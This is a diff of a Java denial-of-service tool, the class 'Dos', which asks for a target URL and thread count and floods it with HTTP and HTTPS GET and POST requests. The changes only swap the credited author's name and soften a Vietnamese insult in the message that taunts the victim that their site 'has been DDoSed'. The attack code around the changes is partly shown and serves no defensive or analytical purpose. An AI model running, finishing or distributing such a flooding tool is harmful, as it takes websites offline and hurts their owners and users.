@@ -52,7 +52,7 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Enter Url DDoS By NTL : ");
+        System.out.print("Enter Url DDoS By Trần Ngọc Quân : ");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("Starting Attack to url : " + url);
@@ -66,7 +66,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Coder By Nguyen Thanh Lam !");
+        System.out.println("Coder By Trần Ngọc Quân !");
 
         System.out.print("Thread: ");
         String amount = in.nextLine();
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("wed cặc của mày đã bị Nguyễn Thanh Lâm ddos!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("wed của bạn đã bị Trần Ngọc Quân ddos!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("wed cặc của mày đã bị Nguyễn Thanh Lâm  ddos !: " + responseCode + "Thread: " + this.seq);
+        System.out.println("wed của bạn đã bị Trần Ngọc Quân ddos!!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("wed cặc của mày đã bị Nguyễn Thanh Lâm  ddos!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("wed của bạn đã bị Trần Ngọc Quân ddos!!:" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("wed cặc của mày đã bị Nguyễn Thanh Lâm ddos!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("wed của bạn đã bị Trần Ngọc Quân ddos!!: " + responseCode + "Thread: " + this.seq);
     }
 }
